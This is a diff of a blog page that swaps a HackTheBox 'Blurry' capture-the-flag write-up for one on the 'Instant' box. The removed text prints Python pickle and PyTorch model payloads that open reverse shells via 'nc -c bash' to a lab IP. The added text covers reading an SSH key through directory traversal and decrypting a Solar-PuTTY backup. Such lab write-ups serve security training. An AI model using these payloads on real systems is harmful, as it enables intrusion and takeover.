@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>[WriteUp] HackTheBox - Blurry | b0rgch3n's blog</title>
-  <meta name='description' content='Blurry is a medium-difficulty box from HackTheBox 2024 Season 5.'>
+  <title>[WriteUp] HackTheBox - Instant | b0rgch3n's blog</title>
+  <meta name='description' content='Instant is a medium difficulty box on HackTheBox'>
 
-  <link rel="canonical" href="https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/">
+  <link rel="canonical" href="https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/">
   <link rel="alternate" type="application/rss+xml" title="b0rgch3n&#39;s blog" href="/feed.xml">
 
   <!-- Fonts -->
@@ -302,7 +302,7 @@
       
       <div class="col col-6 col-t-12">
         <div class="image-box">
-          <img class="post-image lazy" data-src="/images/cover/11.jpg" alt="[WriteUp] HackTheBox - Blurry">
+          <img class="post-image lazy" data-src="/images/cover/14.jpg" alt="[WriteUp] HackTheBox - Instant">
         </div>
       </div>
       
@@ -314,14 +314,14 @@
             <span class="post__minutes">
               
               
-                6 min read
+                5 min read
               
               <time class="post__date"
-                datetime="2024-06-13T16:01:35+08:00">Jun 13, 2024</time>
+                datetime="2024-11-12T05:29:00+08:00">Nov 12, 2024</time>
             </span>
           </div>
         
-          <h1 class="post__title">[WriteUp] HackTheBox - Blurry</h2>
+          <h1 class="post__title">[WriteUp] HackTheBox - Instant</h2>
         
           <div class="post__bottom">
         
@@ -356,297 +356,261 @@
   <article class="post animate">
 
     <div class="post__content">
-      <p>Blurry is a medium-difficulty box in the fifth season of HackTheBox in 2024.</p>
-
-<!--
-Blurry 是 HackTheBox 在 2024 年度第 5 赛季的一个中等难度盒子。
--->
+      <p><strong>Instant</strong> is a medium difficulty box on HackTheBox.</p>
 
 <hr />
 
-<h2 id="enumeration">Enumeration</h2>
+<h2 id="enumeration"><strong>Enumeration</strong></h2>
 
-<p>Let’s start by enumerating.</p>
+<p>Starting as usual with Nmap for initial enumeration and network scanning insights.</p>
 
-<!--
-先进行枚举。
--->
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-1.png" alt="" />
+  <em>nmap scan</em></p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-1.png" alt="" />
-  <em>Nmap scan</em></p>
+<p>No unexpected results:  <br />
+Nmap scan reveals open ports <strong>22</strong> and <strong>80</strong>, which are standard.</p>
 
-<p>The <b>Nmap</b> scan report shows open ports 22 and 80.<br />
-Port 80 is a web service and redirects to the domain “app.blurry.htb”.<br />
-So, You need to configure the hosts file first.</p>
+<p>Setting aside SSH, let’s focus on analyzing the web service on port 80.</p>
 
-<p>Since there is a web service, we should enumerate the directories.</p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-2.png" alt="" />
+  <em>web page</em></p>
 
-<!--
-Nmap 扫描报告显示开放端口有 22、80。  
-80 端口为 Web 服务，且重定向到域名 "app.blurry.htb"，需要先配置一下 hosts 文件。   
+<p>The web service appears to be related to an encrypted wallet application.</p>
 
-配置后对 Web 服务进行枚举目录。
--->
+<p>Next step: proceed with directory enumeration to uncover further data points.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-2.png" alt="" />
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-3.png" alt="" />
   <em>dirsearch scan</em></p>
 
-<p>Also, when accessing the web service through a browser,<br />
-the page information indicates that the service is ClearML.</p>
+<p>Directory scan results for the web service showed no valuable information.</p>
 
-<!--
-通过浏览器访问 Web 服务，页面显示服务为 ClearML。
--->
+<p>We will proceed to subdomain enumeration to check for additional entry points.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-3.png" alt="" />
-  <em>brower access</em></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-4.png" alt="" />
+  <em>ffuf scan</em></p>
 
-<hr />
+<p>Interestingly, even subdomain enumeration yielded a clean report this time.</p>
 
-<h2 id="foothold">Foothold</h2>
+<p>The only potentially useful data on the page is the download link for an APK file.<br />
+Download the APK file, then decode it using apktool to explore its contents.</p>
 
-<p>Found a ClearML-related vulnerability through Google search: <a href="https://github.com/LordVileOnX/ClearML-vulnerability-exploit-RCE-2024-CVE-2024-24590-/tree/main">CVE-2024-24590</a>.</p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-5.png" alt="" />
+  <em>apktool</em></p>
 
-<!--
-Google 搜到一个 ClearML 相关的漏洞：CVE-2024-24590。
--->
+<p>We will scan through the extracted APK contents to identify sensitive information.</p>
 
-<p>All information about this vulnerability points to this article, which includes a detailed demonstration of how the vulnerability can be exploited:<br />
-<a href="https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/">“Machine Learning Operations: What You Need to Know Now - HiddenLayer”</a></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-6.png" alt="" />
+  <em>apk content</em></p>
 
-<!--
-所有关于这个漏洞的信息都指向了这篇文章，文章中包含了具体的漏洞利用参考示范。
--->
+<p>An interesting file, “<strong>network_security_config.xml</strong>” was found in the decoded APK directory.</p>
 
-<p>First, install ClearML.<br />
-Then, go to the settings page of the web service and copy the configuration information.</p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-7.png" alt="" />
+  <em>config file: network_security_config.xml</em></p>
 
-<!--
-安装 clearml，然后到 Web服务的设置页面中，复制配置信息。
--->
+<p>This file lists two subdomains.</p>
 
-<p>The configuration information involves three addresses in the ClearML initialization settings: <b>web_server</b>, <b>api_server</b>, and <b>files_server</b>.<br />
-We need to configure the hosts file to add the DNS entries for these three domains.</p>
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">mywalletv1</span><span class="p">.</span><span class="n">instant</span><span class="p">.</span><span class="n">htb</span>
+<span class="n">swagger</span><span class="o">-</span><span class="n">ui</span><span class="p">.</span><span class="n">instant</span><span class="p">.</span><span class="n">htb</span></code></pre></figure>
 
-<!-- 
-配置信息涉及 clearml 初始化设置中的三个地址：web_server、api_server、files_server。
-需要配置 hosts 文件，将相关的三个域名 DNS 添加进去。
--->
+<p>Attempting direct access to the mywalletv1 subdomain returns a 404 error, indicating it’s not accessible.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-4.png" alt="" /></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-8.png" alt="" />
+  <em>web page</em></p>
 
-<figure class="highlight"><pre><code class="language-markdown" data-lang="markdown"><span class="p">10.</span>10.11.19 app.blurry.htb	# web_server
-<span class="p">10.</span>10.11.19 api.blurry.htb	# api_server
-<span class="p">10.</span>10.11.19 files.blurry.htb	# files_server</code></pre></figure>
+<p>The swagger-ui subdomain hosts API documentation, disclosing several sensitive endpoints.<br />
+Most API interfaces, however, require authentication for access.</p>
 
-<p>Initialize the ClearML configuration with the “<b>clearml-init</b>” command and paste the copied content.</p>
-
-<!--
-通过 clearml-init 命令初始化配置  clearml，并将粘贴刚刚复制的内容。
--->
-
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-5.png" alt="" /></p>
-
-<p>From observation, the account Black Swan repeats the “Review JSON Artifacts” task every so often.</p>
-
-<p>The task’s code contains the deserialization code needed to trigger the vulnerability.</p>
-
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-6.png" alt="" /></p>
-
-<p>After a detailed code review, we can understand its logic roughly as follows:</p>
-<ol>
-  <li>Check all tasks with project_name “<b>Black Swan</b>” and tags <b>[‘review’]</b>.</li>
-  <li>Iterate through these tasks and call <b>artifact.get()</b> for deserialization.</li>
-  <li>Destroy these tasks after the iteration.</li>
-</ol>
-
-<!--
-根据观察，账户 Black Swan 每过一段时间就会重复执行 "Review JSON Artifacts" 任务。
-而任务的代码里面包含了触发漏洞需要的反序列号代码。
-
-如果详细审查代码，我们可以理解代码的逻辑大致为：
-1.检查所有 project_name 为 "Black Swan" 且 tags 为 ["review"] 的任务。
-2.遍历这些任务并且以此调用 artifact.get() 进行反序列化。
-3.遍历结束后销毁这些任务。
--->
-
-<p>Based on the code audit results,<br />
-we need to ensure consistency in the <b>project_name</b> and <b>tags</b> when testing with the PoC code.</p>
-
-<!--
-根据以上代码审计结果，我们在使用 Poc 代码进行测试需要对其进行确保 project_name 以及 tags 的一致。
--->
-
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">clearml</span> <span class="kn">import</span> <span class="n">Task</span>
-<span class="kn">import</span> <span class="n">pickle</span><span class="p">,</span> <span class="n">os</span>
-
-<span class="k">class</span> <span class="nc">RunCommand</span><span class="p">:</span>
-    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
-        <span class="c1"># Payload
-</span>        <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">echo Hacked by b0rg | nc 10.10.14.19 14443</span><span class="sh">'</span><span class="p">,))</span>
-<span class="n">command</span> <span class="o">=</span> <span class="nc">RunCommand</span><span class="p">()</span>
-
-<span class="n">project_name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Black Swan</span><span class="sh">'</span>
-<span class="n">task_name</span> <span class="o">=</span> <span class="sh">'</span><span class="s">TestNotMatchTaskName</span><span class="sh">'</span>
-<span class="n">tags</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">review</span><span class="sh">'</span><span class="p">]</span>
-
-<span class="n">task</span> <span class="o">=</span> <span class="n">Task</span><span class="p">.</span><span class="nf">init</span><span class="p">(</span><span class="n">project_name</span><span class="p">,</span> <span class="n">task_name</span><span class="p">,</span> <span class="n">tags</span><span class="p">)</span>
-<span class="n">task</span><span class="p">.</span><span class="nf">upload_artifact</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">pickle_artifact</span><span class="sh">'</span><span class="p">,</span> <span class="n">artifact_object</span><span class="o">=</span><span class="n">command</span><span class="p">,</span> <span class="n">retries</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">wait_on_upload</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">extension_name</span><span class="o">=</span><span class="sh">'</span><span class="s">.pkl</span><span class="sh">'</span><span class="p">)</span></code></pre></figure>
-
-<p>Use <b>nc</b> to listen and execute the PoC code.</p>
-
-<p>After waiting for Black Swan to repeat the “Review JSON Artifacts” task, we will see message echoing in the terminal.</p>
-
-<!--
-通过 nc 监听，并执行 Poc 代码。
-等待 Black Swan 再次重复执行 "Review JSON Artifacts" 任务后，我们能看到终端出现了消息回显。
--->
-
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-7.png" alt="" /></p>
-
-<p>Modify the <b>Payload</b> to turn the PoC code into Exploit code.</p>
-
-<!--
-修改 Payload 使 Poc 代码成为 Exploit 代码。
--->
-
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc <span class="nt">-c</span> bash 10.10.14.19 14443</code></pre></figure>
-
-<p>Again, listen using <b>nc</b>, and execute the exploit code to gain user permissions and obtain a reverse shell.</p>
-
-<!--
-再次通过 nc 监听，并执行 Exp 代码，获得用户权限反向 Shell。
--->
-
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-8.png" alt="" /></p>
-
-<!--
--->
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-9.png" alt="" />
+  <em>web page: apidocs</em></p>
 
 <hr />
 
-<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h2 id="foothold"><strong>Foothold</strong></h2>
 
-<p>Use <b>linpeas.sh</b> for enumeration and collect information related to privilege escalation.</p>
+<p>To proceed, let’s register a user account.</p>
 
-<p>The scan results show that the current user has an <b>SSH private key</b>, which can be used for persistent access.</p>
+<p>Using the register endpoint, we create an account, noting the PIN must be a 5-digit numerical code.</p>
 
-<!--
-使用 linpeas.sh 进行枚举，收集权限提升相关信息。
-扫描结果显示当前用户存在 SSH 私钥，可用于持久化访问。
--->
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># Like this:
+</span><span class="p">{</span>
+  <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">b0rgch3n@wearehackerone.com</span><span class="sh">"</span><span class="p">,</span>
+  <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">12345</span><span class="sh">"</span><span class="p">,</span>
+  <span class="sh">"</span><span class="s">pin</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">12345</span><span class="sh">"</span><span class="p">,</span>
+  <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">b0rgch3n</span><span class="sh">"</span>
+<span class="p">}</span></code></pre></figure>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-9.png" alt="" /></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-10.png" alt="" />
+  <em>api: /register</em></p>
 
-<p>Another interesting piece of information is that the current user has <b>NOPASSWD sudo</b> access.</p>
+<p>Registration successful.</p>
 
-<!--
-另一个有趣的信息是，当前用户存在 NOPASSWD 的 SUDO。
--->
+<p>We then log in via the login endpoint, which provides an “Access-Token” for authentication.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-10.png" alt="" /></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-11.png" alt="" />
+  <em>api: /login</em></p>
 
-<p>Let’s take a look at the source code of <b>evaluate_model</b>,<br />
-we can see that <b>evaluate_model</b> actually calls the “<b>/models/evaluate_model.py</b>” file.</p>
+<p>Authentication token received, and we’re ready for further validation.</p>
 
-<!--
-查看看 evaluate_model 的源码能发现 实际上调用了 "/models/evaluate_model.py" 文件。
--->
+<p>Let’s validate the token by testing its functionality.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-11.png" alt="" /></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-12.png" alt="" />
+  <em>api: /view/profile</em></p>
 
-<p>Looking at the source code of <b>evaluate_model.py</b>,<br />
-we can see that there is a step for loading the model,<br />
-which leads us to anticipate the presence of a <b>deserialization</b> vulnerability.</p>
+<p>The token returns user information, indicating it’s active and functional.<br />
+An endpoint “<strong>/api/v1/admin/read/log</strong>” suggests a potential for arbitrary file reads,<br />
+but admin privileges are required, so we need a strategy to gain admin access.</p>
 
-<!--
-查看 evaluate_model.py 源码，其中存在模型加载的步骤，我们大致能够预判也是存在反序列化漏洞。
--->
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-13.png" alt="" />
+  <em>api: /admin/read/log</em></p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-12.png" alt="" /></p>
+<p>It seems we’ve exhausted useful information from this subdomain.</p>
 
-<p>By constructing malicious model code,<br />
-we can generate a custom pth file containing a reverse shell.</p>
+<p>Revisiting the source code, we’ll search for any hardcoded sensitive data.</p>
 
-<!--
-通过构造恶意的模型代码，我们能够生成包含反向 Shell 的自定义 pth 文件。
--->
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-14.png" alt="" />
+  <em>review code</em></p>
 
-<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="n">torch</span>
-<span class="kn">import</span> <span class="n">torch.nn</span> <span class="k">as</span> <span class="n">nn</span>
-<span class="kn">import</span> <span class="n">torch.nn.functional</span> <span class="k">as</span> <span class="n">F</span>
-<span class="kn">import</span> <span class="n">os</span>
+<p>A new subdomain was identified, also providing API services.</p>
 
-<span class="k">class</span> <span class="nc">Net</span><span class="p">(</span><span class="n">nn</span><span class="p">.</span><span class="n">Module</span><span class="p">):</span>
-    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
-        <span class="nf">super</span><span class="p">(</span><span class="n">Net</span><span class="p">,</span> <span class="n">self</span><span class="p">).</span><span class="nf">__init__</span><span class="p">()</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">layer1</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="nc">Linear</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">layer2</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="nc">Linear</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span>
-        <span class="n">self</span><span class="p">.</span><span class="n">layer3</span> <span class="o">=</span> <span class="n">nn</span><span class="p">.</span><span class="nc">Linear</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+<p>After trying terms like “pass,” “pwd,” “user,” and “token” without results,<br />
+the search term “<strong>admin</strong>” led to a promising finding.</p>
 
-    <span class="k">def</span> <span class="nf">forward</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
-        <span class="n">x</span> <span class="o">=</span> <span class="n">F</span><span class="p">.</span><span class="nf">relu</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="nf">layer1</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
-        <span class="n">x</span> <span class="o">=</span> <span class="n">F</span><span class="p">.</span><span class="nf">relu</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="nf">layer2</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
-        <span class="n">action</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">layer3</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
-        <span class="k">return</span> <span class="n">action</span>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-15.png" alt="" />
+  <em>review code</em></p>
 
-    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
-        <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">nc -c bash 10.10.14.19 14443</span><span class="sh">'</span><span class="p">,))</span>
+<p>It appears that <strong>com.instantlabs.instant.AdminActivities</strong> contains admin-related information, including smali code related to admin testing.</p>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
-    <span class="n">n</span> <span class="o">=</span> <span class="nc">Net</span><span class="p">()</span>
-    <span class="n">torch</span><span class="p">.</span><span class="nf">save</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="sh">'</span><span class="s">getshell.pth</span><span class="sh">'</span><span class="p">)</span></code></pre></figure>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-16.png" alt="" />
+  <em>review code</em></p>
 
-<p>Upload this code to the machine and execute it to generate the <b>getshell.pth</b> file.<br />
-Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
+<p>It looks like we’ve located the admin authentication credentials.</p>
 
-<!--
-上传该代码到机器上，执行生成 getshell.pth 文件。
-通过 nc 监听，然后执行  NOPASSWD SUDO 利用。
--->
+<p>We’ll test the admin-specific credentials on relevant API endpoints.</p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-13.png" alt="" /></p>
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-17.png" alt="" />
+  <em>api: /admin/list/users</em></p>
 
-<p>Gain administrator privileges.</p>
+<p>We’ve secured admin credentials.<br />
+Next, we’ll explore the arbitrary file-read endpoint for potential escalation.</p>
 
-<!--
-获得管理员权限。
--->
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-18.png" alt="" />
+  <em>api: /admin/read/log</em></p>
 
-<p><img src="/images/2024-06-13-writeup-hackthebox-blurry/image-14.png" alt="" /></p>
+<p>Yes, directory traversal allows us to read arbitrary files on the server.<br />
+This can be utilized for privilege escalation by locating sensitive files for login information.</p>
 
-<p>Nice!</p>
+<p>Two files of particular interest are:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">~/</span><span class="p">.</span><span class="n">bash_history</span> 
+<span class="o">~/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">id_rsa</span></code></pre></figure>
+
+<p>.bash_history is unfortunately empty, but the id_rsa file is intact.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-19.png" alt="" />
+  <em>api: /admin/read/log</em></p>
+
+<p>We now possess the <strong>SSH private key</strong> for user shirohige.<br />
+Copy the SSH key to our system, set permissions to 644, and log in as shirohige via SSH.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-20.png" alt="" />
+  <em>user shell</em></p>
+
+<p>We’ve successfully gained a shell with shirohige’s user privileges.</p>
+
+<hr />
+
+<h2 id="privilege-escalation"><strong>Privilege Escalation</strong></h2>
+
+<p>Continue privilege escalation efforts by investigating source code further.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-21.png" alt="" />
+  <em>review code</em></p>
+
+<p>Attempting password recovery from SQLite is unlikely to be feasible.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-22.png" alt="" />
+  <em>SQLite database</em></p>
+
+<p>It’s time to stop guessing.  <br />
+Running <strong>Linpeas.sh</strong> will help gather more privilege escalation information.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-23.png" alt="" />
+  <em>open ports</em></p>
+
+<p>Two local-only ports, 8808 and 8888, are detected.<br />
+Port forwarding reveals they are the same API services identified earlier.</p>
+
+<p>Let’s move on, SQLite information reappears.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-24.png" alt="" />
+  <em>sqlite database</em></p>
+
+<p>Re-evaluating hash-cracking possibilities for the identified password hashes.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-25.png" alt="" />
+  <em>code about hash</em></p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-26.png" alt="" />
+  <em>code about hash</em></p>
+
+<p>Confirmed password hash format as <strong>PBKDF2-HMAC-SHA256</strong> with 60,000 iterations.</p>
+
+<p>After spending significant time without success, I found a key detail.<br />
+The final “$” segment can be encoded in Base64 or hex.<br />
+Python’s Werkzeug uses hex,<br />
+while cracking tools like John and Hashcat require Base64.</p>
+
+<p>Even so, cracking remains unsuccessful, moving on to assess other clues.</p>
+
+<p>I found a <strong>sessions-backup.dat</strong> file under the <strong>/opt</strong> directory.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-27.png" alt="" />
+  <em>backup file</em></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/opt/backups/Solar-PuTTY/sessions-backup.dat</code></pre></figure>
+
+<p>This file appears encrypted, referring to available decryption tools: <a href="https://github.com/ItsWatchMakerr/SolarPuttyCracker">SolarPuttyCracker</a>.</p>
+
+<p>Due to the tool SolarPuttyCracker is outdated, switching to a more recent decryption utility was necessary: <a href="https://github.com/VoidSec/SolarPuttyDecrypt">SolarPuttyDecrypt</a>.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-28.png" alt="" />
+  <em>SolarPuttyDecrypt</em></p>
+
+<p>Decryption successful!  <br />
+The SolarPutty configuration file password is “<strong>estrella</strong>”.  <br />
+The file reveals root account credentials.</p>
+
+<p>However, direct SSH login as root is restricted. <br />
+So, We’ll log in as shirohige, and then switch to root.</p>
+
+<p><img src="/images/2024-11-12-writeup-hackthebox-instant/image-29.png" alt="" />
+  <em>root shell</em></p>
+
+<p>Successfully accessed root shell privileges :)</p>
+
 
     </div>
 
     <div class="post__share">
       <div class="share__list">
-        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
 
-        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=[WriteUp]%20HackTheBox%20-%20Blurry&url=https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
+        <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=[WriteUp]%20HackTheBox%20-%20Instant&url=https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
 
-        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://b0rgch3n.github.io/2024/06/13/writeup-hackthebox-blurry/&amp;media=https://b0rgch3n.github.io/images/cover/11.jpg&amp;description=[WriteUp]%20HackTheBox%20-%20Blurry" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
+        <a class="share__link share__pinterest" href="http://pinterest.com/pin/create/button/?url=https://b0rgch3n.github.io/2024/11/12/writeup-hackthebox-instant/&amp;media=https://b0rgch3n.github.io/images/cover/14.jpg&amp;description=[WriteUp]%20HackTheBox%20-%20Instant" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;" title="Share on Pinterest" rel="nofollow"><i class="ion ion-logo-pinterest"></i></a>
       </div>
     </div>
 
     <div class="post__navigation">
       
-      <a class="prev" href="/2021/03/19/solutions-object-detection-0-to-001-yolov4/">
-        <img class="post__nav-image lazy" data-src="/images/cover/12.jpg" alt="[Solutions] Object Detection 0 to 0.01: YOLOv4">
+      <a class="prev" href="/2024/09/14/how-to-make-a-breakfast-money-with-pawns-app/">
+        <img class="post__nav-image lazy" data-src="/images/cover/ish.svg" alt="How to make a breakfast money with Pawns.app">
         <div class="post__nav-box">
           <div class="post__nav post__nav__prev"><i class="ion ion-md-arrow-round-back"></i> Previous Post</div>
-          <h4 class="post__nav__title">[Solutions] Object Detection 0 to 0.01: YOLOv4</h4>
+          <h4 class="post__nav__title">How to make a breakfast money with Pawns.app</h4>
         </div>
       </a>
       
-      
-      <a class="next" href="/2024/07/18/writeup-hackthebox-permx/">
-        <img class="post__nav-image lazy" data-src="/images/cover/10.jpg" alt="[WriteUp] HackTheBox - PermX">
-        <div class="post__nav-box">
-          <div class="post__nav post__nav__next">Next Post <i class="ion ion-md-arrow-forward"></i></div>
-          <h4 class="post__nav__title">[WriteUp] HackTheBox - PermX</h4>
-        </div>
-      </a>
       
     </div>
 
@@ -675,66 +639,6 @@ Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
             
 
             
-
-            <div class="article col col-4 col-d-6 col-t-12 grid__post">
-              <div class="article__inner">
-
-                
-                <a class="article__image" href="/2024/11/12/writeup-hackthebox-instant/">
-                  <img class="lazy" data-src="/images/cover/14.jpg" alt="[WriteUp] HackTheBox - Instant">
-                </a>
-                
-
-                <div class="article__content">
-
-                  <div class="article__meta">
-                    <span class="article__minutes">
-                      
-                      
-                        4 min read
-                      
-                      <time class="article__date"
-                        datetime="2024-11-12T05:29:00+08:00">Nov 12, 2024</time>
-                    </span>
-                  </div>
-
-                  <h1 class="article__title">[WriteUp] HackTheBox - Instant</h2>
-
-                  <p class="article__excerpt">Instant is a medium difficulty box on HackTheBox</p>
-
-                  <div class="article__bottom">
-
-                    
-                    <div class="article__author">
-                      <a href="/about/" aria-label="b0rgch3n"><img class="article__author-image lazy" data-src="/images/author.jpg" alt="b0rgch3n's Picture"></a>
-                    </div>
-                    
-
-                    <div class="article__bottom-meta">
-                      
-                        <a href="/about/" class="article__author-link">b0rgch3n</a>
-                      
-                      
-                      <span>in</span>
-                      <span class="article-tags">
-                        
-                          <a href="/tag/writeup/" class="article__tag">WriteUp</a>
-                        
-                          <a href="/tag/hack-the-box/" class="article__tag">Hack The Box</a>
-                        
-                      </span>
-                      
-                    </div>
-                  </div>
-
-                </div>
-
-              </div>
-            </div>
-
-            
-                
-              
             
             
             
@@ -772,7 +676,7 @@ Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
                     <span class="article__minutes">
                       
                       
-                        4 min read
+                        6 min read
                       
                       <time class="article__date"
                         datetime="2024-09-03T13:57:00+08:00">Sep 3, 2024</time>
@@ -841,7 +745,7 @@ Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
                     <span class="article__minutes">
                       
                       
-                        4 min read
+                        5 min read
                       
                       <time class="article__date"
                         datetime="2024-08-26T15:21:00+08:00">Aug 26, 2024</time>
@@ -871,6 +775,75 @@ Then, listen using <b>nc</b>, and execute the <b>NOPASSWD sudo</b> exploit.</p>
                           <a href="/tag/writeup/" class="article__tag">WriteUp</a>
                         
